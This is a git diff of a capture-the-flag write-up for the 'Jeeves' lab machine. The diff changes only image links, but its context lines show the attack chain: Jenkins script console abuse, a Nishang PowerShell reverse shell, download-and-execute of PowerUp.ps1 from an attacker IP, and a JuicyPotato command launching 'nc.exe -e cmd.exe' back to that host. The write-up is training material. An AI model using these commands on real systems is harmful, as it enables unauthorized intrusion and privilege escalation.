@@ -1,6 +1,6 @@
 # Jeeves
 
-![](<../../../.gitbook/assets/image (9) (1) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1) (1).png>)
 
 ## Reconnaissance <a href="#491d" id="491d"></a>
 
@@ -75,7 +75,7 @@ gobuster dir -u http://10.129.174.184:50000 -w /usr/share/wordlists/dirbuster/di
 
 Looking at the http site we are presented with a search bar
 
-![](<../../../.gitbook/assets/image (15) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1) (1) (1).png>)
 
 Searching takes you to error.html which turns out to just be an image
 
@@ -111,11 +111,11 @@ Quickly checking gobuster for jetty shows that we have a directory to check out
 
 Going there we see Jenkins!
 
-![Jenkins](<../../../.gitbook/assets/image (24) (1) (1).png>)
+![Jenkins](<../../../.gitbook/assets/image (24) (1) (1) (1).png>)
 
 Turns out we have command execution without needing to be logged in which works in our favor
 
-![](<../../../.gitbook/assets/image (7) (1).png>)
+![](<../../../.gitbook/assets/image (7) (1) (1).png>)
 
 ## Initial Access
 
@@ -125,13 +125,13 @@ Using Nishang Invoke-PowerShellTcp.ps1 script we can create a reverse shell and 
 
 First we want to copy the example to the bottom of the script so that it is run when copied to the machine we are attacking
 
-![](<../../../.gitbook/assets/image (10) (1).png>)
+![](<../../../.gitbook/assets/image (10) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (6) (1) (1).png>)
 
 Next we want to get a web server running and a netcat listener to catch the reverse shell. In this se I am using [updog](https://github.com/sc0tfree/updog) for my simple web server.
 
-![](<../../../.gitbook/assets/image (12) (1) (1).png>)
+![](<../../../.gitbook/assets/image (12) (1) (1) (1).png>)
 
 Using the script console again I run this command to download and execute the invoke powershell tcp reverse shell script
 
@@ -151,7 +151,7 @@ Next we want to run PowerUp.ps1 however we want to use the dev branch as it has 
 
 {% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/dev" %}
 
-![](<../../../.gitbook/assets/image (13) (1).png>)
+![](<../../../.gitbook/assets/image (13) (1) (1).png>)
 
 Then we want to run these commands in our reverse shell
 
@@ -160,7 +160,7 @@ IEX(New-Object Net.WebCLient).downloadString('http://10.10.14.92/PowerUp.ps1')
 Invoke-AllChecks # This runs the powershell function to check everything
 ```
 
-![](<../../../.gitbook/assets/image (2) (1).png>)
+![](<../../../.gitbook/assets/image (2) (1) (1).png>)
 
 Right away we see SeImpersonatePrivilege which means this box is vulnerable to Juicy Potato!
 
@@ -168,7 +168,7 @@ Right away we see SeImpersonatePrivilege which means this box is vulnerable to J
 
 We first need to download JuicyPotato.exe to the box which I am hosting from my kali box
 
-![](<../../../.gitbook/assets/image (22) (1).png>)
+![](<../../../.gitbook/assets/image (22) (1) (1).png>)
 
 We need to copy kali's nc.exe to the windows box
 
@@ -177,7 +177,7 @@ We need to copy kali's nc.exe to the windows box
 Invoke-WebRequest "http://10.10.14.92/nc.exe" -OutFile "nc.exe"
 ```
 
-![](<../../../.gitbook/assets/image (8).png>)
+![](<../../../.gitbook/assets/image (8) (1).png>)
 
 Next we want to run JuicyPotato!
 
@@ -192,7 +192,7 @@ This is the input I used:
 cmd /c jp.exe -l 9001 -p c:\windows\system32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.92 9001" -t *
 ```
 
-![Got a shell](<../../../.gitbook/assets/image (23) (1).png>)
+![Got a shell](<../../../.gitbook/assets/image (23) (1) (1).png>)
 
 We got nt authority\system!&#x20;
 
@@ -202,7 +202,7 @@ When we try and take a look at the administrators desktop we see hm.txt with an 
 
 Then I tried this
 
-![Alternate Data Streams](<../../../.gitbook/assets/image (9) (1) (1) (1).png>)
+![Alternate Data Streams](<../../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)
 
 Alternate Data Streams, find more about them here
 
